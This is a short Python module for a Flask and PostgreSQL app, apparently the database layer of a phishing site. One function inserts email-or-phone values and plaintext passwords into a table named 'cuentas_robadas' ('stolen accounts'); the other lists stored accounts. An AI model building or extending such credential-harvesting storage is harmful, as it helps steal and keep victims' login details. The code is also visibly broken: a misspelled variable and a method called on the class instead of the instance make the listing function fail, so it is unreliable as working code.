from database.db import get_connection
from .entities.Cuenta import Cuenta
from flask import flash
from psycopg2 import IntegrityError

class ModelCuenta():

  @classmethod
  def get_Cuentas(self):
    try:
      conn = get_connection()
      Cuentas = []

      with conn.cursor() as cursor:
        cursor.execute('SELECT * FROM cuentas ORDER BY id')
        resultset = cursor.fetchall()

        for row in resultset:
          ceunta = Cuenta(row[0], row[1], row[2])
          Cuentas.append(Cuenta.to_Dict())
      conn.close()
      return Cuentas
    except Exception as ex:
      raise Exception(ex)
    
  @classmethod
  def insert_cuenta(self, c: Cuenta):
    try:
      conn = get_connection()
      cursor = conn.cursor()
      sql = "insert into cuentas_robadas (correo_o_telefono, contraseña) values (%s, %s)"
      params = (c.correo_o_telefono, c.contraseña)
      cursor.execute(sql, params)
      conn.commit()
    except Exception as ex:
      raise Exception(ex)    
    